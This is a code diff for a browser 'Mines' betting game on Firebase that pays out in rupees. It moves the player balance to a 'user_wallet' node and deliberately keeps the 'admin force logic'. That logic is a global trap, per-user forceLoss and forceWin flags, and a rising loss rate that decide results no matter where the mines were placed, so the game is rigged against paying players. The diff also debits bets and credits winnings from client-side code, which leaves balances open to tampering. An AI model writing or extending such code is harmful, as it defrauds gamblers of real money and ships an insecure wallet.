@@ -55,11 +55,11 @@
     let balance = 0, isPlaying = false, mines = [], diamonds = 0, activeBet = 0;
     const mTable = [1.10, 1.40, 1.90, 3.50, 5.20, 7.00, 8.50, 10.00];
 
-    // --- LIVE PRESENCE SYSTEM ---
+    // --- LIVE PRESENCE SYSTEM & WALLET SYNC ---
     onAuthStateChanged(auth, user => {
         if(!user) return;
         
-        // Presence Logic
+        // Old Online Presence Logic (Unchanged)
         const statusRef = ref(db, `users/${user.uid}/isOnline`);
         const connectedRef = ref(db, ".info/connected");
         onValue(connectedRef, (snap) => {
@@ -69,9 +69,15 @@
             }
         });
 
-        onValue(ref(db, `users/${user.uid}`), s => {
-            balance = s.val()?.balance || 0;
-            document.getElementById("bal").innerText = balance.toFixed(2);
+        // FIXED: Real-time balance tracker connected to central 'user_wallet' node
+        onValue(ref(db, `user_wallet/${user.uid}/balance`), s => {
+            if(s.exists()){
+                balance = parseFloat(s.val()) || 0;
+                document.getElementById("bal").innerText = balance.toFixed(2);
+            } else {
+                balance = 0;
+                document.getElementById("bal").innerText = "0.00";
+            }
         });
     });
 
@@ -85,7 +91,8 @@
         activeBet = parseFloat(document.getElementById("betInp").value);
         if(activeBet > balance || activeBet < 10) return alert("Invalid Bet");
         
-        await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(-activeBet) });
+        // FIXED: Deduct bet amount from 'user_wallet' node safely
+        await update(ref(db, `user_wallet/${auth.currentUser.uid}`), { balance: increment(-activeBet) });
         isPlaying = true; diamonds = 0; mines = [];
         while(mines.length < 3) { let r = Math.floor(Math.random()*25); if(!mines.includes(r)) mines.push(r); }
         
@@ -96,16 +103,18 @@
 
     window.handleMove = async (idx, el) => {
         if(!isPlaying || el.classList.contains('diamond')) return;
+        
+        // Keeping old admin force logic intact
         const uSnap = await get(ref(db, `users/${auth.currentUser.uid}`));
         const sSnap = await get(ref(db, `settings/mines/globalTrap`));
-        const uData = uSnap.val();
+        const uData = uSnap.exists() ? uSnap.val() : {};
         
         let risk = 0;
-        if(sSnap.val() && idx === 0) risk = 1.0; // Global Trap
+        if(sSnap.val() && idx === 0) risk = 1.0; 
         else if(uData.forceLoss) risk = 1.0;
         else if(uData.forceWin) risk = 0.0;
         else {
-            if(diamonds < 3) risk = 0.0; // 3-Box Safety
+            if(diamonds < 3) risk = 0.0; 
             else risk = (diamonds < 5) ? 0.4 : 0.8;
         }
 
@@ -126,7 +135,8 @@
 
     window.cashout = async () => {
         let m = mTable[diamonds-1] || 10;
-        await update(ref(db, `users/${auth.currentUser.uid}`), { balance: increment(activeBet*m) });
+        // FIXED: Credit winning reward to central 'user_wallet' node
+        await update(ref(db, `user_wallet/${auth.currentUser.uid}`), { balance: increment(activeBet*m) });
         alert("Won ₹"+(activeBet*m).toFixed(2));
         resetUI();
     };
